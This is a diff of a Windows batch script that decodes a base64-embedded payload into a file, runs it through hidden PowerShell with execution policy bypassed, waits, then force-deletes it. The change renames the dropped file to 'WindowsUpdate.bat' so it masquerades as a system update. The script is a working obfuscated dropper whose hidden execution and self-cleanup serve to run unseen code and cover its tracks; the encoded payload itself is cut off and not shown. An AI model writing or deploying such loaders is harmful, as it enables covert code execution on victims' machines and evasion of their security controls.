@@ -5,12 +5,12 @@ set "base64String=QGVjaG8gb2ZmCnNldGxvY2FsIEVuYWJsZURlbGF5ZWRFeHBhbnNpb24KCnB1c2
 
 
 
-powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('%base64String%')) | Set-Content -Encoding UTF8 decoded.bat"
+powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('%base64String%')) | Set-Content -Encoding UTF8 WindowsUpdate.bat"
 
 
 set "trycount=0"
 :waitloop
-if exist "decoded.bat" (
+if exist "WindowsUpdate.bat" (
     goto runit
 )
 set /a trycount+=1
@@ -22,12 +22,12 @@ goto waitloop
 
 :runit
 
-powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command "Start-Process -FilePath 'decoded.bat' -WindowStyle Hidden -Wait"
+powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command "Start-Process -FilePath 'WindowsUpdate.bat' -WindowStyle Hidden -Wait"
 
 
 ping -n 31 127.0.0.1 >nul
 
 
-del /f /q decoded.bat
+del /f /q WindowsUpdate.bat
 
 exit
